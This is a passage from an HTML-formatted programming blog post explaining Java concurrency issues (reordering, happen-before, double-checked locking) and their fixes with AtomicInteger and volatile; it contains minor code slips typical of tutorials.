&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; a&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;b&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt; t1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            a&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            b&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        t1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;b&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; a&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; err &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;%th round, Non thread safe!&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;err&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;err&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;        t1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;In the writing order, we assign a=2 first and then b=1, so it should never happen that the code runs the block behind the if condition in line 12. But it’s possible. Although it’s very rare to happen, it DO happen.&lt;/p&gt;
&lt;p&gt;Note that visibility and ordering are often seen together as the problem of &lt;a href=&quot;https://en.wikipedia.org/wiki/Happened-before&quot;&gt;happen-before&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;It’s common that implementing singleton pattern with double-checked locking to improve performance. If you were not aware of happen-before, it may cause some issue: even if the singleton instance is not null, that does not mean that system had finished constructed the singleton instance. You can see more detail in this &lt;a href=&quot;https://en.wikipedia.org/wiki/Double-checked_locking&quot;&gt;wiki&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;So let’s see how Java and Golang solve these issues.&lt;/p&gt;
&lt;h1 id=&quot;java&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#java&quot;&gt;#&lt;/a&gt; Java&lt;/h1&gt;
&lt;h2 id=&quot;how-java-solve-atomicity&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#how-java-solve-atomicity&quot;&gt;#&lt;/a&gt; How Java solve Atomicity&lt;/h2&gt;
&lt;p&gt;Java provides &lt;strong&gt;package java.util.concurrent.atomic&lt;/strong&gt; to guarantee the atomicity when accessing a shared variable. For example, we could use &lt;strong&gt;AtomicInteger&lt;/strong&gt; to fix the first example in the beginning like below:&lt;/p&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;InterruptedException&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; times &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;100000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;ExecutorService&lt;/span&gt; executorService &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Executors&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newFixedThreadPool&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;Counter&lt;/span&gt; counter &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Counter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;times&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        executorService&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            counter&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;incrementAndGet&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    executorService&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;shutdown&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;counter&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Counter&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;AtomicInteger&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;AtomicInteger&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;how-java-solve-happen-before&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#how-java-solve-happen-before&quot;&gt;#&lt;/a&gt; How Java solve happen-before&lt;/h2&gt;
&lt;p&gt;Java uses keyword &lt;strong&gt;volatile&lt;/strong&gt; to ensure happen-before. Once you declare a variable with volatile, then happen-before is guaranteed in that variable.&lt;/p&gt;
&lt;p&gt;Let’s look at the secondary example in the beginning, I use volatile to declare the variable as below:&lt;/p&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;InterruptedException&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;Flag&lt;/span&gt; flag &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Flag&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt; t1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;flag&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;bool&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token comment&quot;&gt;// do nothing&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    t1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt; t2 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        flag&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;bool &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;flag&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;bool&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    t2&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;flag&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;bool&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    t1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Unreachable&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Flag&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;boolean&lt;/span&gt;  bool &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now when thread t2 updates bool variable in Flag, thread t1 would be aware of that and escape from the for loop.&lt;/p&gt;
&lt;p&gt;Then the third example. After I declare variables a and b with volatile, Compiler would make sure that a=2 happen before b=1, so it would guarantee that the program never enters if statement.&lt;/p&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; a&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;b&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt; t1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            a&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            b&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        t1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;b&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; a&lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; err &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;%th round, Nonthread 